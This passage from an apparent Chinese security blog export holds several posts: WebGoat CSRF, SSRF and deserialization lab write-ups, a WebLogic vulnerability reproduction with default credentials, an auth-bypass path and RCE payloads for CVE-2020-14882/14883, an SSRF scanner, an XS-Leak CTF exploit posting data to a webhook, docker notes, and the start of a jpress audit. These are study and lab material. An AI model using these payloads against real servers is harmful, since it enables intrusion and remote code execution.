初体验题目部分\n\n首先要明确的一点，其实 CSRF 也是钓鱼攻击，而不是像 SQL 注入那么直接与暴力。因此这里我们借用第三方的 WebWolf 作为受害者进行操作。\n借用 Burpsuite 的 CSRF Poc，CSRF 的原理我就不阐述了，有兴趣的师傅们可以移步至 从0到1完全掌握CSRF\n\n\n接着将其发送到 WebWolf 上，点击链接即可，再输入我们的答案。\n\n\n\n源码部分文件位置在 CSRFGetFlag 文件处，未对 CSRF 进行任何请求上的针对。\n2. CSRF PageLesson4 CSRF 应用场景\n题意：从其他网站以当前用户身份提交一条评论\n\n其实攻击手段都是差不多的，我这里就加速过了\n\n\n3. CSRF PageLesson7\n题意：从其他网站向webgoat服务器发送下图中的JSON消息\n\n把 POC 进行一下解码\n      &lt;input type=\"hidden\" name=\"&#123;\n  \"name\"    : \"WebGoat\",\n  \"email\"   : \"webgoat@webgoat.org\",\n  \"content\" : \"WebGoat is the best!!\"\n&#125;\" value=\"\" />\n\n\n仔细观察发现 这里的name value是键值对\nname=value\n\n所以像上图的poc的话 html中的结果就是如下\n由于value为空 所以便会出现如下这种情况\n&#123;\"name\":\"WebGoat\",\"email\":\"webgoat@webgoat.org\",\"content\":\"WebGoat is the best!!\" &#125;=\n\n\n所以我们需要对poc进行改进 ，因为无论如何都有 &#x3D; 所以我们得把等号包含进去\n比如\nname &#123;&quot;name&quot;: &quot;WebGoat&quot;, &quot;email&quot;: &quot;webgoat@webgoat.org&quot;, &quot;content&quot;: &quot;WebGoat is the best!!&quot;, &quot;ignoreme&quot;:&quot;\nValue &#39;sdfsdfdf&quot;&#125;\n这样的话正常结果就是如下\nname &#x3D; value\n&#123;\"name\": \"WebGoat\", \"email\": \"webgoat@webgoat.org\", \"content\": \"WebGoat is the best!!\", \"ignoreme\":\"=sdfsdfdf\"&#125;\n\n最终的 Payload\n&lt;html>\n &lt;!-- CSRF PoC - generated by Burp Suite Professional -->\n \t&lt;body>\n \t&lt;form action=\"http://124.222.21.138:9000/WebGoat/csrf/feedback/message\" method=\"POST\" enctype=\"text/plain\">\n \t&lt;input type=\"hidden\" name='&#123;\"name\": \"pasa\",\"email\":\"passsaa@wobwolf.com\",\"subject\":\"service\",\"message\":\"' value='aaa\"&#125;'>\n \t&lt;/form>\n \t&lt;script>\n \tdocument.forms[0].submit();\n\t&lt;/script>\n \t&lt;/body>\n&lt;/html>\n\n4. CSRF PageLesson8就新建一个账号………… CSRF 这块确实难设计。\n\n\n对 CSRF 这一块我个人还是有点失望的，本来还想看一看 CSRF 这里有什么基础防御手法，以及绕过手段的，结果只是有几个应用场景而已。\n0x03 SSRF1. SSRF PageLesson2其实有点奇怪，我不知道为什么这个场景会出现在 WebGoat 里面，其实这算是一点前端未设计好的东西，和 SSRF 有啥关系。\n\n靶场界面如图所示\n\n\n\n题目要求我们将 Tom 的图片修改成 jerry 的图片，我们这里先点开图片，然后将 images 修改为 jerry.png。一般这种情况，暴露出路径，而且未处理的话，是更有可能造成文件上传的 Getshell 的。\n用 Burpsuite 抓包，将 tom 修改成 jerry 即可。\n\n\n\n2. SSRF PageLesson3\n这里利用 ifconfig.pro 来显示接口。\n\nPayload 一般如下\nhttp:&#x2F;&#x2F;ifconfig.pro]\n\n就是单纯的这种 Payload，不要自作聪明将 http 后面加上 IP 与端口。\n同样 bp 抓包后，修改 url 为 http://ifconfig.pro 即可。\n\n\n0x04 小结因为最近自己也打算开发靶场的，就怎么说呢。。。\n其实我觉得 CSRF 设计的还是不错的，就是少了一点绕过手段与防御讲解，CSRF 本来考点，或者说是利用点就不是那么多，不用该只是如此潦草地设计的。\nSSRF 的话，其实也能理解吧就，因为 Java 里面能利用的 SSRF 毕竟是很少，但是那几个协议最好还是设计进去的吧 ……\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"WebGoat代码审计-08-不安全的反序列化","url":"/2022/05/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-08-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"WebGoat代码审计-08-不安全的反序列化\n\nWebGoat代码审计-08-不安全的反序列化\n反序列化的入门静下心来看看，就算不是题目的地方也好好整理、理解一下。\n\n1. Insecure Deserialization PageLesson3 简单的反序列化代码我们以这段代码进行举例说明\nInputStream is = request.getInputStream();\nObjectInputStream ois = new ObjectInputStream(is);\nAcmeObject acme = (AcmeObject)ois.readObject();\n\n它期望一个 AcmeObject 对象，但是它将在强制转换发生之前执行 readObject()。如果攻击者发现适当的类在 readObject() 中实现了危险的操作，他可以序列化该对象，并强制易受攻击的应用程序执行这些操作。\nClassPath 中包含的类\n攻击者需要在 ClassPath 中找到一个支持序列化并在 readObject() 上具有危险实现的类。这一段代码能够被利用就是因为它定义了 readObject()\npackage org.dummy.insecure.framework;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.ObjectInputStream;\nimport java.io.Serializable;\nimport java.time.LocalDateTime;\n\npublic class VulnerableTaskHolder implements Serializable &#123;\n\n        private static final long serialVersionUID &#x3D; 1;\n\n        private String taskName;\n        private String taskAction;\n        private LocalDateTime requestedExecutionTime;\n\n        public VulnerableTaskHolder(String taskName, String taskAction) &#123;\n                super();\n                this.taskName &#x3D; taskName;\n                this.taskAction &#x3D; taskAction;\n                this.requestedExecutionTime &#x3D; LocalDateTime.now();\n        &#125;\n\n        private void readObject( ObjectInputStream stream ) throws Exception &#123;\n        &#x2F;&#x2F;deserialize data so taskName and taskAction are available\n                stream.defaultReadObject();\n\n                &#x2F;&#x2F;blindly run some code. #code injection\n                Runtime.getRuntime().exec(taskAction);\n     &#125;\n&#125;\n利用\n如果上面显示的 java 类存在，攻击者可以序列化该对象再 RCE\nVulnerableTaskHolder go &#x3D; new VulnerableTaskHolder(&quot;delete all&quot;, &quot;rm -rf somefile&quot;);\n\nByteArrayOutputStream bos &#x3D; new ByteArrayOutputStream();\nObjectOutputStream oos &#x3D; new ObjectOutputStream(bos);\noos.writeObject(go);\noos.flush();\nbyte[] exploit &#x3D; bos.toByteArray();\n\n\n2. Insecure Deserialization PageLesson5 反序列化代码审计题目部分\n题意让我们设计五秒的延时，也算是命令执行了(?)\n\n给的一串字符，让我们反序列化一下而已，没什么用。\n\n\n直接看源码。\n源码部分InsecureDeserializationTask.java\n\n重点关注这一段源码\n\n\n\n后端拿到我们的 token 之后进行了一个特殊符号替换，然后进行了 base64 解码，解码过后进行了 readObject() 反序列化操作。\n最后判断一下这个对象是不是 VulnerableTaskHolder 的实例。所以，我们反序列化的对象也就确定了，那就是 VulnerableTaskHolder 类的实例。\n进到 VulnerableTaskHolder 类中，找到了 readObject() 方法。\n\n\n可以看到这里直接利用 Runtime.getRuntime().exec() 执行了 taskAction,而 taskAction 是在构造函数里被赋值的。所以我们可以通过控制 taskAction 来控制执行的命令。\n\n\n\n漏洞实现有两点要求 1）创建的对象必须是 VulnerableTaskHolder 类的实例，包名得一致；  2) 创建的序列化对象，时间戳必须在当前时间的前十分钟以内，否则会报 The task is not executable between now and the next ten minutes, so the action will be ignored. Maybe you copied an old solution? Let’s try again 错误。所以 VulnerableTaskHolder 类中的构造方法得减去一定得时间。\n\n我们在 VulnerableTaskHolder 同級目錄下建立一個 SerialMain.java\npackage org.dummy.insecure.framework;  \nimport java.io.ByteArrayOutputStream;  \nimport java.io.ObjectOutputStream;  \nimport java.util.Base64;\n\n  \npublic class SerialMain &#123;  \n  \n    static public void main(String[] args)&#123;  \n        try&#123;  \n            VulnerableTaskHolder go = new VulnerableTaskHolder(\"sleep\", \"sleep 6\");  \n            ByteArrayOutputStream bos = new ByteArrayOutputStream();  \n            ObjectOutputStream oos = new ObjectOutputStream(bos);  \n            oos.writeObject(go);  \n            oos.flush();  \n            byte[] exploit = bos.toByteArray();  \n            String exp = Base64.getEncoder().encodeToString(exploit);  \n            System.out.println(exp);  \n        &#125; catch (Exception e)&#123;  \n  \n        &#125;  \n    &#125;  \n&#125;\n\n我这里 Java Thymeleaf 环境炸了，无心修理。\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"WebLogic 弱口令&文件上传&SSRF","url":"/2023/03/06/WebLogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-SSRF/","content":"WebLogic 弱口令&amp;文件上传&amp;SSRF 漏洞复现\n\n0x01 前言将 WebLogic 一些其他漏洞全部放在这篇文章里面了，一共是以四个下漏洞\n\nCVE-2014-4210 SSRF\nCVE-2018-2894 任意文件上传\nCVE-2020-14882&#x2F;CVE-2020-14883 未授权 RCE\n弱口令 getshell\n\n以复现为主，暂不分析；打算从易到难讲起\n0x02 环境搭建此处不再赘述，可以翻阅以往文章\n0x03 弱口令 getshell访问 WebLogic /console 接口，可能存在的弱口令如下\n\n\n\n账户\n密码\n\n\n\n\nsystem\npassword\n\n\nweblogic\nweblogic\n\n\nguest\nguest\n\n\nportaladmin\nportaladmin\n\n\nadmin\nsecurity\n\n\njoe\npassword\n\n\nmary\npassword\n\n\nsystem\nsecurity\n\n\nwlcsystem\nwlcsystem\n\n\nwlcsystem\nsipisystem\n\n\n\n\n更多的一些常见弱密码：\nweblogic1  \nweblogic12  \nweblogic123  \nweblogic@123  \nwebl0gic  \nweblogic#  \nweblogic@\n\n注意一下不能使用 bp 抓包去爆破，错误密码5次之后就会自动锁定\n这一个弱口令可以和任意文件上传漏洞联合起来打\n漏洞复现先使用弱口令登录，点击部署下的安装\n\n\n选择“上载文件”\n\n\n上传恶意的 war 包，这个恶意 war 包是由冰蝎生成，压缩为 zip 之后，将后缀名改为 .war 的\n\n\n继续默认点击位于上方的下一步，直至遇到并点击完成\n\n\n接着，启动我们之前部署的恶意 war 包\n\n\n选择 “为所有请求提供服务”\n\n\n正常启动之后，如下：\n\n\n成功 getshell\n\n\n\n\n0x04 CVE-2020-14882&#x2F;CVE-2020-14883 未授权 RCE先聊一聊未授权，后面再讲 RCE\n影响版本Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0\n漏洞原理\nCVE-2020-14883：允许未授权的用户通过目录穿越结合双重 URL 编码的方式来绕过管理控制台的权限验证访问后台。\nCVE-2020-14882：允许后台任意用户通过 HTTP 协议执行任意命令。\n\n漏洞复现主要是以下两个 CVE 的组合利用，显示未授权访问后台，然后通过后台可以执行命令的接口实现 RCE。\nCVE-2020-14883正常情况下，没有登录 WebLogic 的话访问 console 后台就会直接 302 跳转到 /console/login/LoginForm.jsp 登录界面。\n\n\n但是，通过目录穿越结合双重 URL 编码就能绕过认证实现未授权访问 console 后台：\n对应的 payload 为\n&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal\n\n\n\n其中 %252e%252e%252f 为二次 url 编码的 ../ ，通过这个就可以实现穿越路径未授权访问相关管理后台。\n访问后台后，发现和之前复现的弱密码登陆的页面不一样，之前的通过弱密码登陆管理员账号的界面有部署功能：\n\n\n这时候就需要用到后台任意命令执行（CVE-2020-14883）了。\nCVE-2020-14883前面的 CVE 虽然可以访问后台，但是是低权限用户、无法安装应用，此处我们需要借助 CVE-2020-14883\n这个漏洞的利用方式有两种，一是通过 com.tangosol.coherence.mvel2.sh.ShellSession，二是通过 com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext\n方式一com.tangosol.coherence.mvel2.sh.ShellSession\n\n但此利用方法只能在 Weblogic 12.2.1 及以上版本利用，因为 10.3.6 并不存在 com.tangosol.coherence.mvel2.sh.ShellSession 类。\n直接访问如下URL，即可利用 com.tangosol.coherence.mvel2.sh.ShellSession 执行命令，下面是 dnslog 探测的 payload\nhttp:&#x2F;&#x2F;ip:7001&#x2F;console&#x2F;console.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;curl%20vnmh1ymd4u6vz2lgrt60s6zid9jz7o.oastify.com&#39;);&quot;)\n\n有回显的 paylaod：\n&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?test_handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20&#x3D;%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20&#x3D;%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20&#x3D;%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20&#x3D;%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20&#x3D;%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20&#x3D;%20req.getHeader(%22cmd%22);String[]%20cmds%20&#x3D;%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22&#x2F;c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22&#x2F;bin&#x2F;sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!&#x3D;%20null%20)&#123;%20String%20result%20&#x3D;%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20&#x3D;%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt();\n\n执行的命令添加在 http 头部的 cmd 字段：\n\n\n方式二com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext\n\n这是一种更为通杀的方法，最早在 CVE-2019-2725 被提出，对于所有 Weblogic 版本均有效。\n首先，我们需要构造一个 XML 文件，并将其保存在 Weblogic 可以访问到的服务器上：\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n   xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n    &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n        &lt;constructor-arg>\n          &lt;list>\n            &lt;value>bash&lt;/value>\n            &lt;value>-c&lt;/value>\n            &lt;value>&lt;![CDATA[ping nh8vcdige9vlja513ugyqowj1a70vp.oastify.com]]>&lt;/value>\n          &lt;/list>\n        &lt;/constructor-arg>\n    &lt;/bean>\n&lt;/beans>\n\n如果是 windows 可以尝试弹计算器，然后通过如下 URL，即可让 Weblogic 加载这个 XML，并执行其中的命令：\n&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:&#x2F;&#x2F;example.com&#x2F;rce.xml&quot;)\n\n\n\n但是该方法需要 Weblogic 的服务器能够访问到恶意 XML，在服务器不出网的时候无法利用。\n0x05 CVE-2014-4210 SSRF影响版本\nOracle WebLogic Server 10.0.2, 10.3.6\n\n漏洞原理WebLogic 的 SearchPublicReqistries.jsp 接口存在 SSRF 漏洞，如果服务端或内网存在 Redis 未授权访问漏洞等则可以进一步打漏洞组合拳进行攻击利用。\n漏洞代码如下，是比较容易看懂的\n\n\n漏洞利用SSRF 漏洞存在于 http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如 http://127.0.0.1:7001：\n&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001\n\n探测 7001 端口结果如下，错误信息是\nweblogic.uddi.client.structures.exception.XML_SoapException: The server at http:&#x2F;&#x2F;127.0.0.1:7001 returned a 404 error code &amp;#40;Not Found&amp;#41;.  Please ensure that your URL is correct, and the web service has deployed without error.\n\n\n\n探测 7000 端口结果如下\n\n\n\n此时的错误信息是\n\nweblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &#39;1&#39; addresses, but could not connect over HTTP to server: &#39;127.0.0.1&#39;, port: &#39;7000&#39;\n\n根据两者不同的回显，可以用来探测资产\n自动化检测 weblogic 的 ssrf（需要在当前目录下创建一个 domain.txt 文件，里面就写 Weblogic 的访问方式，保存为 check_weblogic_ssrf.py）\ndomain.txt\nhttp:&#x2F;&#x2F;your-ip:7001&#x2F;\n\ncheck_weblogic_ssrf.py\n#!/usr/bin/env python  \n \n# -*- coding: utf-8 -*-\nimport re\nimport sys\nimport Queue\nimport requests\nimport threading\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n \nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\nqueue = Queue.Queue()\nmutex = threading.Lock()\n \nclass Test(threading.Thread):\n    def __init__(self, queue):\n        threading.Thread.__init__(self)\n        self.queue = queue\n        \n    def check(self,domain,ip):\n        payload = \"uddiexplorer/SearchPublicRegistries.jsp?operator=&#123;ip&#125;&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search\".format(ip=ip)\n        url = domain + payload\n        try:\n            html = requests.get(url=url, timeout=15, verify=False).content\n            m = re.search('weblogic.uddi.client.structures.exception.XML_SoapException',html)\n            if m:\n                mutex.acquire()\n                with open('ssrf1.txt','a+') as f:\n                    print \"%s has weblogic ssrf.\" % domain\n                    f.write(\"%s has weblogic ssrf.\" % domain)\n                mutex.release()\n        except Exception,e:\n            print e\n            \n    def get_registry(self,domain):\n        payload = 'uddiexplorer/SetupUDDIExplorer.jsp'\n        url = domain + payload\n        try:\n            html = requests.get(url=url, timeout=15, verify=False).content\n            m = re.search('&lt;i>For example: (.*?)/uddi/uddilistener.*?&lt;/i>',html)\n            if m:\n                return m.group(1)\n        except Exception,e:\n            print e\n \n    def run(self):\n        while not self.queue.empty():\n            domain = self.queue.get()\n            mutex.acquire()\n            print domain\n            mutex.release()\n            ip = self.get_registry(domain)\n            self.check(domain,ip)\n            self.queue.task_done()\nif __name__ == '__main__':\n    with open('domain.txt','r') as f:\n        lines = f.readlines()\n    for line in lines:\n        queue.put(line.strip())\n    for x in xrange(1,50):\n        t = Test(queue)\n        t.setDaemon(True)\n        t.start()\n    queue.join()\n\n0x06 CVE-2018-2894 任意文件上传\n是一个比较简单的洞\n\n影响版本10.3.6，12.1.3，12.2.1.2，12.2.1.3\n漏洞原理weblogic如果开启了web服务测试页（默认不开启），则分别会在&#x2F;ws_utc&#x2F;begin.do以及&#x2F;ws_utc&#x2F;config.do这两个页面存在任意上传getshell漏洞\n由于该设置默认不开启，所以此漏洞有一定的局限性\n漏洞复现登录上 console，点 base_domain，在 “配置” -&gt; “一般信息” -&gt; “高级” 中开启 “启用 Web 服务测试页” 选项\n\n\n我这里环境没跑起来，没发现存在 Web 服务检测页，有兴趣的师傅可以看一下 johnFord 师傅的文章\nhttps://johnfrod.top/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e5%a4%8d%e7%8e%b0/weblogic%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%ef%bc%88cve-2018-2894%ef%bc%89/\n0x07 ReferenceWebLogic弱口令getshell [ Mi1k7ea ]浅析WebLogic任意文件上传（CVE-2018-2894） [ Mi1k7ea ]浅析WebLogic SSRF（CVE-2014-4210） [ Mi1k7ea ]浅析WebLogic未授权RCE（CVE-2020-14882&#x2F;CVE-2020-14883） [ Mi1k7ea ]https://johnfrod.top/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e5%a4%8d%e7%8e%b0/weblogic%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%ef%bc%88cve-2018-2894%ef%bc%89/\n","categories":["漏洞复现"],"tags":["漏洞复现","Java","WebLogic"]},{"title":"XS泄露漏洞学习","url":"/2022/04/10/XS%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/","content":"XS Leak 漏洞学习\n\nXS Leak 漏洞学习0x01 前言之前在做 HTB 题目时，遇到了这个漏洞，顺便学习一下。题目链接：Hack The Box :: Challenges\n0x02 什么是 XS LeakXS Leak，最早被叫做 XS Search，因为要和 XSS(跨站脚本攻击) 区分开，于是取名为 XS Leak，也就是 XS 泄露；XS 泄露最主要能够获取信息，算是信息泄露的一种攻击。\n\n\n“ 所以说了这么多，你还是没说咋个样子算是 XS Leak。”\n好 ~ 莫急，且听我娓娓道来\n\n\nXS Leak 的攻击方式主要是通过检索数据库信息实现的，简单来说，很多搜索界面，SQL 语句处会存在 XS Leak。\n举个栗子我们在搜索界面搜索 “Alice”，若返回的是 “404”，则说明 “Alice” 不在数据库中，然后进行爆破，最后能够找到存在的数据 “admin”，而它的状态码是 “200”;\n\n而最早的 XS Leak 是\n\n对于攻击者来说，就是信息收集的一部分。\n\n\n:“ 就这，有啥用嘛。”\n你也许觉得这没什么用处，但是如果用来检索密码或者一些商业来往邮件呢？\n好吧，这听着好像是没有用，可是随着技术不断更新，XS Leak 的攻击方式不断改进。\n\n\n0x03 XS Leak 的利用\n本来这篇文章几乎对于我来说已经很难写下去了，可是最近 CatCTF 当中，在测题的过程中偶然发现了 XSLeak 的真正用处，它并非是一个“鸡肋”\n\n在开始说利用之前，需要明确的是 XSLeak 并非是一种漏洞，而是一种作辅助的攻击手法。\n在这道 CatCTF 的题目 pastebin 当中，听 LemonPerfect 师傅说有部分是参考原题的，是一个 XSS 打 XSLeak 的题目，挺有意思。\n先放 exp\n&lt;script>\n    let text = new URLSearchParams(location.search).get('text')\n    let w = window.open('http://localhost:5000/find?text=' + text)\n    setTimeout(() => &#123;\n        w.location = 'about:blank'\n        setTimeout(() => &#123;\n            console.log(w.history.length)\n            const webhook = 'https://webhook.site/c171b240-3c3f-4121-91f3-a4f3a6987e35'\n            fetch(webhook, &#123;method:'POST', body:w.history.length&#125;)\n        &#125;, 1000)\n    &#125;, 2000)\n&lt;/script>\n\nwebhook 是一个网站，地址是 https://webhook.site可以用来拦截请求。\n而那道题目当中，admin will visit your site soon，这也就构成了一个 xss，所以我们请求可以这么写\nhttp://vps:port/exp.html?text=catctf&#123;xxx\n\n如果正确，回显2，错误回显3，完全正确回显1\n0x04 小结小结一下，该怎么说呢？XSLeak 更像是一种思想&amp;攻击的辅助手段，而并非是一种漏洞，所以作为 HTB 的那一道题目，只是介绍了这种攻击辅助方式，非常有趣，能够相当拓宽攻击者的攻击思路。\n","categories":["web安全"],"tags":["web安全"]},{"title":"docker的使用","url":"/2021/10/12/docker%E7%9A%84%E4%BD%BF%E7%94%A8/","content":"docker的使用\n\n\n\n最近在弄关于ctfd的东西，要用到docker。\n\n于是乎，云集docker的使用，写出一篇自己的心得\n首先，弄明白docker image与Container的关系\n形容一下，image就是Java中的类，而Container是Java对象\nimage也叫做镜像，而container叫做容器\n\n0x01 进入正题：如何使用docker\n先在dockerhub上拉取docker image\n\n这里我们以CTF题目为例\n\n\n先执行\ndocker pull ctftraining/qwb_2019_supersqli\n\n\n这里的docker pull是用来抓取image文件的命令\n\n在本机查看image文件\ndocker image ls\n\n\n\n镜像需要启动后，才能变成容器，-d表示后台运行，不然会一直卡着界面\ndocker run -itd 容器ID       // 这里 -i，-t，-d分别是三个参数\n\n\n这里出现的的出现，是因为docker中的镜像被新的镜像覆盖的时候，老版本的镜像名称会变成，删除即可\n\n删除镜像的指令\ndocker rmi -f 容器id\n\n\n\n删除容器的命令\ndocker rm -f 容器id\n\n\n再强调一遍，docker的镜像与容器是两个概念！\n\n0x02 docker网络1.查看docker容器的ip先查看所有网络\ndocker network ls\n\n\n\n\n接着通过命令得到容器IP\n\ndocker network inspect 容器ID\n\n0x03 ctfd中docker的frp容器一直restarting的问题\n报错如图所示\n\n\n\n\n原因：frps与frp容器连接有问题\n可以通过docker logs 分析日志\n\n总结下来有几种解决方法\n1.如果是端口被占用通过杀进程解决\nsystemctl stop frps\nsystemctl disable frps     // 取消自启动\nsystemctl start frps\n\n2.如果是显示FRP未配置通过添加网络即可\nsudo docker network connect frpcadmin &lt;frpc容器名或者ID>\nsystemctl start frps\n\n0x04 docker 拉 MySQL几步命令\nsudo docker pull mysql:latest\n\nsudo docker run -itd --name mysql-test -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql\n\nsudo docker exec -it 容器ID env LANG=C.UTF-8 /bin/bash\n\nmysql -h localhost -u root -p\n\nMySQL 中存在中文乱码的问题\n","categories":["环境搭建"],"tags":["环境搭建"]},{"title":"golang 重构 sqlmap","url":"/2023/03/13/golang-%E9%87%8D%E6%9E%84-sqlmap/","content":"golang 重构 sqlmap，正文暂时不放出来了\n\n\n\n拖了很久的文章，终于要提笔写了\n\n这算是一个给自己练手的项目，在阅读完毕 sqlmap 的源码之后，我觉得应该自己用 golang 重构一下，准备提笔写代码时发现困难重重，一个是因为自己写这种项目的经历并不丰富，第二是因为没有一个完整的思路与架构，例如，什么该写，什么不该写，哪些功能比较鸡肋，哪些功能很重要，一时间难以定夺。\n基于上述情景，我觉得应该再把这个功能图拿出来，决定一下需要写哪些功能\n\n\n最重要的根据顺序应该是这样\n判断连接性 ——&gt; 产生 payload ——&gt; 启发性探测注入 ——&gt; 结果进行页面比较 ——&gt; 获取注入结果\n","categories":["工具开发&编写"],"tags":["工具开发&编写"]},{"title":"jpress V4.2 代码审计","url":"/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"jpress V4.2 代码审计\n\n0x01 前言最近做 CMS 审计的时候恰好碰到了这么一个框架，学习漏洞不光是要会打，还要明白原理，结合网站可知；是用 jpress V4.2 搭建的，来学习一手。（后面发现是 就press3.0，我是小丑\njpress 类似于 WordPress Write in Java，和 PHP 的 WordPress 非常像。不过 Java 搭建环境会比 PHP 要复杂一些，当时我自己也是因为环境搭建的问题卡了很久（非常多的问题，不只是 maven，这一块踩坑的师傅可以滴滴我\n比起普通的 SpringBoot 搭建的 Java 环境相比，jpress 使用的 jBoot，和 SpringBoot 十分类似，不过看点其他架构写的项目也是比较有趣。\n0x02 环境搭建\n这个项目的环境搭建会有点烦躁\n\n项目地址：https://github.com/JPressProjects/jpress\n去到 release 页面下，下载 v4.2 版本的，后续会对新版本当中的漏洞进行挖掘。\n下载完毕项目之后，先在项目界面输入命令\nmvn clean package\n\n此处比较坑，我遇到的问题是\n\n\nFailed to execute goal org.apache.maven.plugins:maven-jar-plugin:2.4:jar (default-jar) on project codegen: Execution default-jar of goal org.apache.maven.plugins:maven-jar-plugin:2.4:jar failed: A required class was missing while executing org.apache.maven.plugins:maven-jar-plugin:2.4:jar: org/codehaus/plexus/components/io/resources/PlexusIoResourceCollection\n\n将存储 maven 仓库的所有库都删掉即可，接着再执行命令即可。\n搭建完毕之后创建数据库，但不要导入文件，也不要修改任何配置，直接跑项目。\n项目跑起来之后会访问到 http://localhost:8080/install 下\n\n\n按照要求完成安装之后，会让你配置一些网站信息。\n\n\n至此，搭建完成！\n\n\n在 undertow.txt 中可以修改端口\n0x03 代码审计代码审计准备架构理解jpress 项目分为前台页面和后台管理界面，前台页面是纯前端的内容，所以漏洞点主要是在后台管理页面这里。\n在后台管理界面这里，需要在模板 —&gt; 所有模板中选择对应的模板，才能在前台页面看到一些漏洞的回显。比如 XXE，XSS 这些，在公司测试的时候没有注意到这一点，吃了些亏。\npom.xml 与 Filter 等审计查看父项目的 pom.xml，发现用的都是最新版本的组件，理论上不存在组件漏洞。\n此项目中不存在 Filter，这就意味着很可能存在 SQL 注入或者是 XSS\n\n存在多 module，需要我们对不同 module 功能块进行审计，尽量从一个漏洞发现者的角度去看，这样还是可以学到很多的。\n\n模板渲染引起的 RCE影响接口/admin/article/setting\n/admin/page/setting\n/admin/product/setting\n/admin/template/edit\n\n\n在 setting 目录下存在好几处的模板渲染漏洞\n\n漏洞分析为什么想到这个漏洞呢？原因是在文章 ——&gt; 设置这里面的 “评论邮件通知管理员” 中；官方给出了例子，告诉我们可以用 #(comment.id)，那么猜测这里可能会存在模板渲染问题，此处对应的模板是 Velocity\n进去看与文章评论相关的类，找到是这一个 ———— io.jpress.module.article.controller.front.ArticleController，这里是有关于前台页面当中，对于文章的管理的一个类。我们在 postComment() 方法处下一个断点，这个方法的作用主要是将评论信息保存到数据库，同时还会发送短信通知网站管理员。\n\n\n我们先开启文章评论的功能，如图\n\n\n接着发布一条评论，来看一看它的运行流程。\n\n\n前面是一系列的赋值与基础判断，有兴趣的师傅们可以自行调试看一下，属于是很简单的部分。直接看重点部分，第 268 行。\n\n\n跟进一下，进入到 notify() 方法，它这里面定义了两种将评论发送给管理员的方式，一种是 Email 的形式，另外一种是 Sms 的形式。我们先跟进 email 的看一下，这里会先判断是否开启了 article_comment_email_notify_enable，如果开启了则进入到 email 的形式当中。\n\n\n跟进 doSendEmail() 方法，它去做了 SendEmail 这个动作的具体业务实现。\n\n\ndoSendEmail() 方法前面都是一些基础赋值，到第 90 行看到了模板渲染操作，在第 90 和 91 行，分别对邮件的 emailTitle 和 emailTemplate 调用 getTemplateByString() 方法进行渲染，这两个变量对应 